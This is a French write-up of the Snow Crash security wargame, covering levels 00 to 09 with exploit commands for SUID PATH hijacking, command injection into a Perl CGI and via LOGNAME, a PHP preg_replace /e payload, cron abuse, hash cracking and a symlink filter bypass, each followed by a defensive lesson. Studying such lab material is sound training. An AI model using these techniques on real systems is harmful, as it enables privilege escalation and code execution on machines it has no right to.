# Snow Crash — Writeup

> Wargame d'introduction à la sécurité informatique.
> Objectif : à chaque niveau, trouver le mot de passe de l'utilisateur `flagXX`,
> se connecter en tant que `flagXX`, puis exécuter `getflag` pour obtenir le token
> servant de mot de passe au niveau suivant.

**Environnement** : VM 64-bit (ISO fournie), accès SSH sur le port `4242`.
**Login initial** : `level00` / `level00`.

**Méthode appliquée à chaque niveau** : exploration de base avant analyse.

```bash
id                              # qui suis-je, quels groupes
ls -la                          # ce que contient mon home
find / -user flagXX 2>/dev/null # les fichiers du compte cible
```

Et trois questions systématiques face à tout élément suspect :
**qui** l'exécute, **quand**, et **avec quels droits**.

---

## Level00 — Chiffrement par décalage (César)

**Contexte**
On trouve sur le système un fichier en lecture seule appartenant à `flag00`,
contenant la chaîne `cdiiddwpgswtgt`.

**Raisonnement**
La chaîne ne ressemble à rien de lisible mais conserve une structure de mot.
Hypothèse : un chiffrement par substitution simple, typiquement un décalage de
type César. Plutôt que de tester un seul décalage, on les essaie tous les 25.

**Exploitation**
```bash
for i in $(seq 1 25); do
    echo -n "Decalage $i : "
    echo "cdiiddwpgswtgt" | tr 'a-z' "$(python3 -c "
import string
a = string.ascii_lowercase
print(a[$i:] + a[:$i])
")"
done
```

Le décalage 11 donne `nottoohardhere` → **"not too hard here"**.

```bash
su flag00   # mot de passe : nottoohardhere
getflag
```

**Notion clé**
Reconnaître un chiffrement faible à sa structure, et casser un César en testant
l'espace réduit des décalages possibles (force brute légitime sur 25 cas).

---

## Level01 — Hash DES dans /etc/passwd

**Contexte**
La ligne de `flag01` dans `/etc/passwd` contient directement un hash au lieu du
classique `x` :

```bash
cat /etc/passwd | grep flag01
# flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

**Raisonnement**
Historiquement, les anciens systèmes Unix stockaient le hash du mot de passe
directement dans `/etc/passwd` (avant l'introduction de `/etc/shadow`). Le hash
`42hDRfypTqqnw` fait 13 caractères : signature typique du **DES Unix**.

**Exploitation**
Sur la machine hôte, avec John the Ripper :

```bash
echo "flag01:42hDRfypTqqnw" > /tmp/hash.txt
john --format=descrypt /tmp/hash.txt
```

John retrouve le mot de passe à partir de ses dictionnaires intégrés.

**Notion clé**
Identifier un type de hash par sa longueur et son format. Un mot de passe stocké
en clair (ou faiblement haché) et lisible par tous est une faille de
configuration majeure.

---

## Level02 — Reconstruction de frappe depuis une capture réseau

**Contexte**
Un fichier `.pcap` (capture réseau) est présent. Le `cat` direct est illisible.
On le récupère sur la machine hôte avec `scp` pour l'ouvrir dans Wireshark.

```bash
scp -P 4242 level02@<IP_VM>:/chemin/vers/capture.pcap /tmp/
```

**Raisonnement**
Une capture réseau enregistre tout le trafic, y compris les données en clair.
On cherche un mot de passe ayant transité. Plutôt que d'inspecter paquet par
paquet, on reconstruit la session complète :
clic droit sur un paquet → **Follow > TCP Stream**.

On y découvre une session de login. La ligne du mot de passe contient des
caractères de contrôle :

```
Password: ft_wandr...NDRel.L0L
```

**Exploitation**
Les `.` représentent des **Backspace** (caractères de contrôle). Il faut
reconstituer la frappe en appliquant chaque effacement au caractère précédent,
dans l'ordre. Le résultat est :

```
ft_waNDReL0L
```

**Notion clé**
Les protocoles non chiffrés exposent tout sur le réseau. Une capture peut
révéler des identifiants, et reconstruire une frappe terminal demande de tenir
compte des caractères de contrôle (Backspace), pas seulement du texte visible.

---

## Level03 — Binaire SUID et manipulation du PATH

**Contexte**
```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 8627 level03
```

Un binaire `level03` appartenant à `flag03`, avec le bit **SUID** (`s`).
Lancé, il affiche `Exploit me`.

**Raisonnement**
Le bit SUID fait s'exécuter le binaire avec les droits de son **propriétaire**
(`flag03`), pas de l'utilisateur qui le lance. L'analyse des chaînes révèle
comment il fonctionne en interne :

```bash
strings ./level03
# ...
# /usr/bin/env echo Exploit me
```

Le binaire appelle `echo` via `/usr/bin/env`. Or `env` cherche les commandes
dans les dossiers listés par la variable `PATH`, **dans l'ordre**. Si on place
un faux `echo` dans un dossier prioritaire, c'est lui qui sera exécuté — avec
les droits de `flag03`.

**Exploitation**
```bash
echo "getflag" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```

**Notion clé**
Un binaire SUID qui appelle une commande sans chemin absolu est vulnérable au
détournement de `PATH`. Toujours invoquer les commandes par leur chemin complet
dans un programme privilégié.

---

## Level04 — Injection de commande via CGI Perl

**Contexte**
Un script Perl tourne comme serveur web sur `localhost:4747`, propriété de
`flag04` avec le bit SUID.

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

**Raisonnement**
Le script récupère le paramètre HTTP `x` et l'injecte directement dans une
commande shell (les backticks `` ` `` exécutent une commande). Aucune validation
de l'entrée → injection de commande. On confirme d'abord sous quel utilisateur
tourne le serveur :

```bash
curl "http://localhost:4747?x=\`id\`"
# uid=3004(flag04) ... → on est bien flag04 via le serveur
```

**Exploitation**
```bash
curl "http://localhost:4747?x=\`getflag\`"
```

Les `\` empêchent le shell **local** d'interpréter les backticks ; ils sont
transmis tels quels au serveur, qui les exécute côté Perl avec les droits de
`flag04`.

**Notion clé**
Ne jamais injecter une entrée utilisateur dans une commande shell sans
validation. Injection de commande classique (OWASP Top 10). La substitution de
commande (`` ` `` ou `$()`) s'évalue côté serveur si elle est correctement
échappée côté client.

---

## Level05 — Tâche cron et dossier surveillé

**Contexte**
Un script `openarenaserver` (propriété de `flag05`) contient :

```bash
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

**Raisonnement**
Plusieurs indices comportementaux indiquent une exécution **automatique** :
le script exécute tous les fichiers d'un dossier sans interaction, les supprime
ensuite (pour repartir propre au prochain passage), et limite chaque exécution à
5 secondes (`ulimit -t 5`) — un pattern typique de worker planifié.

On applique les trois questions : qui ? quand ? avec quels droits ? La recherche
dans les crontabs système (`/etc/crontab`, `/etc/cron.d/`) ne donne rien
d'exploitable, et le crontab de `flag05` n'est pas lisible. On vérifie alors
l'hypothèse directement en pratique, puisqu'on a les droits d'écriture sur
`/opt/openarenaserver/` (confirmé via `getfacl`).

**Exploitation**
```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
# Attendre le passage du cron, puis :
cat /tmp/flag
```

Le fichier déposé est exécuté avec les droits de `flag05`.

**Notion clé**
Les tâches cron tournent souvent avec des droits élevés. Pouvoir écrire dans un
dossier surveillé par un cron privilégié permet d'exécuter du code arbitraire
avec ses droits.

---

## Level06 — Injection de code via `preg_replace /e` (PHP)

**Contexte**
Un binaire SUID `level06` (propriété de `flag06`) appelle un script PHP qui lit
un fichier et applique :

```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    ...
}
```

**Raisonnement**
Le modificateur `/e` (déprécié, supprimé en PHP 7) **évalue la chaîne de
remplacement comme du code PHP**. Tout ce qui est capturé par `(.*)` entre
`[x ...]` est injecté dans `y("...")` puis exécuté. Le format à fournir dans le
fichier se déduit directement de la regex : `[x QUELQUECHOSE]`.

Deux obstacles rendent l'injection non triviale :
1. La capture passe par `y()`, qui transforme tout `.` en ` x ` → impossible
   d'utiliser la concaténation PHP (`.`).
2. Les guillemets dans le payload cassent la chaîne `y("...")`.

L'erreur PHP, une fois provoquée, révèle exactement le code évalué :
`y("...")`, ce qui guide la construction du payload.

**Exploitation**
On utilise l'interpolation de variable complexe `{${ ... }}`, qui force PHP à
évaluer l'expression interne sans point ni guillemet problématique :

```bash
printf '[x {${system(getflag)}}]' > /var/tmp/exploit
./level06 /var/tmp/exploit a
```

`getflag` passé sans guillemets (constante non définie → chaîne, simple Notice).
`system(getflag)` s'exécute avec les droits de `flag06`.

**Notion clé**
Le modificateur `/e` de `preg_replace` est une faille d'exécution de code
arbitraire historique (d'où sa suppression du langage). Lire la regex donne le
format d'entrée accepté ; les messages d'erreur de l'interpréteur sont un guide
précieux pour affiner un payload.

---

## Level07 — Injection via variable d'environnement

**Contexte**
Un binaire SUID `level07` (propriété de `flag07`). L'analyse des chaînes révèle
sa logique :

```bash
strings level07
# LOGNAME
# /bin/echo %s
# getenv ... asprintf ... system
```

Logique reconstruite :
```c
asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
system(buffer);
```

**Raisonnement**
Le binaire lit la variable d'environnement `LOGNAME` (contrôlée par
l'utilisateur), l'insère dans `/bin/echo %s`, et exécute le tout via `system`.
Mettre `LOGNAME=getflag` ne suffit pas : la commande devient `/bin/echo getflag`,
et `getflag` n'est qu'un argument d'`echo`. Il faut le transformer en commande
séparée avec `;`.

**Exploitation**
```bash
LOGNAME=";getflag"
./level07
```

La commande exécutée devient `/bin/echo ;getflag` → `getflag` s'exécute comme
commande indépendante, avec les droits de `flag07`.

**Notion clé**
Les variables d'environnement sont une entrée utilisateur. Les injecter dans une
commande système sans contrôle ouvre la porte à l'exécution arbitraire — même
vecteur que le level04, source différente.

---

## Level08 — Contournement de filtre par lien symbolique

**Contexte**
```bash
ls -la
# -rwsr-s---+ 1 flag08 level08 8617 level08
# -rw------- 1 flag08 flag08    26 token
```

Le binaire `level08` (SUID `flag08`) est un lecteur de fichier, mais refuse de
lire le fichier `token` :

```bash
./level08 token
# You may not access 'token'
```

**Raisonnement**
L'analyse des chaînes montre `strstr` et le message de refus côte à côte. Le
binaire cherche la sous-chaîne `token` dans le chemin fourni, et refuse si elle
est présente :

```c
if (strstr(argv[1], "token")) { printf("You may not access ..."); exit(1); }
```

Confirmé empiriquement : `./level08 token` est refusé, `./level08 /tmp/test`
fonctionne. Le filtre porte sur le **texte** du chemin, pas sur le fichier réel.
Il suffit donc de désigner le même fichier par un chemin ne contenant pas la
chaîne `token` — un lien symbolique.

**Exploitation**
```bash
ln -s /home/user/level08/token /tmp/ouvretoi   # chemin ABSOLU vers la cible
./level08 /tmp/ouvretoi
```

> Piège rencontré : un symlink créé avec un chemin **relatif**
> (`ln -s token /tmp/lien`) pointe vers `token` dans le dossier du lien (`/tmp`),
> qui n'existe pas. Toujours utiliser un chemin absolu vers la cible. À noter
> aussi qu'un hard link ne peut pas traverser deux systèmes de fichiers
> (`Invalid cross-device link`).

**Notion clé**
Un filtre basé sur le nom/texte d'un chemin est trivial à contourner : un lien
symbolique fournit un nom alternatif vers la même donnée. Valider une cible par
son chemin textuel est insuffisant.

---

## Level09 — Reverse d'un chiffrement maison

**Contexte**
Un binaire `level09` (SUID `flag09`) et un fichier `token` illisible
(`----r--r--`, lisible par le groupe `level09`). En testant le binaire :

```bash
./level09 ok                  # → ol
./level09 aaaaaaaa...         # → abcdefgh...
```

**Raisonnement**
Tous les caractères d'entrée identiques (`a`) produisent une sortie croissante
(`a b c d ...`) : chaque caractère est décalé d'une valeur égale à **sa
position** dans la chaîne.

```
position 0 : a +0 → a
position 1 : a +1 → b
position 2 : a +2 → c
```

Confirmé par `ok` → `ol` (`o`+0=`o`, `k`+1=`l`). Le `token` est le résultat
chiffré de cette opération. Pour le déchiffrer, on applique l'opération inverse :
`original = chiffré − position`.

Le binaire contient des protections anti-reverse (`ptrace`, détection
`LD_PRELOAD` via `/proc/self/maps`), contournées sans les affronter : on raisonne
uniquement sur le comportement observable entrée/sortie.

**Exploitation**
Programme C de déchiffrement (lecture des octets bruts + soustraction par
position) :

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(int ac, char **av)
{
    if (ac != 2) { printf("Wrong number arguments\n"); return 1; }
    int file = open(av[1], O_RDONLY);
    if (file < 0) { printf("Open failed\n"); return 1; }
    char buffer[1024];
    int ret = read(file, buffer, 1024);
    if (ret <= 0) { printf("Read failed\n"); return 1; }
    int i = 0;
    while (i < ret && buffer[i] != '\n') {  // s'arrêter au \n final
        putchar(buffer[i] - i);
        i++;
    }
    putchar('\n');
    return 0;
}
```

> Pièges rencontrés : la condition d'arrêt `while (buffer[i])` lisait au-delà des
> octets réels (le fichier n'est pas une chaîne terminée par `\0`) → utiliser le
> retour de `read`. Et le fichier se termine par un `\n` (`0a`, vérifié avec
> `xxd`) qui, déchiffré, produisait un caractère parasite → s'arrêter au `\n`.

**Notion clé**
Sécurité par l'obscurité : un algorithme « secret » mais trivialement réversible
n'offre aucune protection une fois compris. Reverse engineering par observation
du comportement (boîte noire), sans débogueur, contournant ainsi les protections
anti-debug. `xxd`/`od` servent à **inspecter** des données binaires, pas à les
transformer.

---

## Récapitulatif des techniques

| Level | Domaine | Technique |
|-------|---------|-----------|
| 00 | Cryptographie | Chiffrement César / décalage |
| 01 | Cryptographie | Cassage de hash DES (John) |
| 02 | Réseau | Analyse PCAP + reconstruction de frappe |
| 03 | Système | Binaire SUID + détournement de PATH |
| 04 | Web | Injection de commande (CGI Perl) |
| 05 | Système | Tâche cron + dossier surveillé |
| 06 | Web | Injection de code (`preg_replace /e` PHP) |
| 07 | Système | Injection via variable d'environnement |
| 08 | Système | Contournement de filtre par symlink |
| 09 | Reverse | Reverse d'un chiffrement maison |

## Principes transversaux

- **Explorer avant d'analyser** : `id`, `ls -la`, `find / -user flagXX`.
- **Trois questions** face à tout élément actif : qui l'exécute, quand, avec
  quels droits.
- **`strings` pour le reverse basique** : repérer les fonctions (`system`,
  `getenv`, `strstr`, `open`...) et les chaînes de données, puis reconstituer la
  logique et la confirmer empiriquement.
- **Ne jamais faire confiance à une entrée utilisateur** : argument,
  paramètre HTTP, variable d'environnement, nom de fichier — tout est un vecteur.
- **Sécurité par l'obscurité ≠ sécurité** : un secret cesse de protéger dès qu'il
  est compris.

## Note sur les outils (portabilité soutenance)

Les soutenances se déroulent sur des machines Fedora sans Kali. Les outils
privilégiés sont donc natifs ou en ligne : `john`, `wireshark`/`tshark`, `gcc`,
`xxd`, et les services web `regex101.com`, `crackstation.net`.
